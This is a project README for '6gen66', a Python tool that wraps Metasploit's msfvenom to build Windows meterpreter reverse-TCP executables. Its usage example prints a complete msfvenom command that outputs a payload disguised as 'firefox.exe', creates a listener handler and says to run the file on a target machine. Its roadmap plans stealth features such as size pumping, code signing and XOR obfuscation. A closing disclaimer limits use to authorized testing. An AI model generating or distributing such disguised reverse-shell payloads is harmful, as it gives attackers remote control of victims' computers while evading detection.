# 6gen66

## What is 6gen66 ? 

**6gen66** is an automated payload creating tool using [Metasploit](https://www.metasploit.com/)'s payload generation ability.

## Features
 - Automated payload generation and compilation based on user input
 - Lightweight Script
 - Single file to compile and generate payload
 - Automatic public IP detection
 - Automated creation of arguments for msfvenom
 - No external Python libraries

## Requirements

- Python 3
- Metasploit Framework
- A system/network configuration appropriate for your authorized testing environment

## Installation

To simply install and run 6gen66 :
```
git clone https://github.com/yigit-sozmen/6gen66.git
cd 6gen66
python3 6gen66.py
```

## Usage
###  User Inputs
**6gen66** requires 3 inputs to work. These are:
 - Your Public/Local IP
 - Listening port
 - Output filename

For Example :
```
Your public IP is: 192.0.2.44
Do you want to use it ? (Yes/No) n
Your IP: 10.0.2.15
Enter Your LPORT : 8080
Enter your payload name(For example: explorer):
**firefox**
Setting payload name to: firefox.exe
Generating payload...
Executing: msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.2.15 LPORT=8080 -f exe -o firefox.exe
Your payload, firefox.exe generated successfully.
Creating a handler file for Metasploit...
Successfully created a handler.rc file!

Your payload 'firefox.exe' is ready.
To use with Metasploit:
1. Run: msfconsole -r handler.rc
2. Then run the generated .exe on target machine
```

## Roadmap

6gen66 is still in early stages of development. Future improvements will be:
 - File size pumping for more stealth
 - Code signing improvements
 - Encryption for XOR obfuscation.
 - 6gen66's own payload creator and listener instead of Metasploit Framework to reduce external dependencies
 - Better logging
 - Documentation
 - Reproducible builds
 - Improved error handling

## Contributing 

6gen66 is rewritten completely in Python. Some older features are not included in the newer versions.

Contributions and suggestions are always welcome !

## Disclaimer

6gen66 is intended for authorized security testing, research, and educational lab environments. Do not use it against systems or networks without explicit permission.
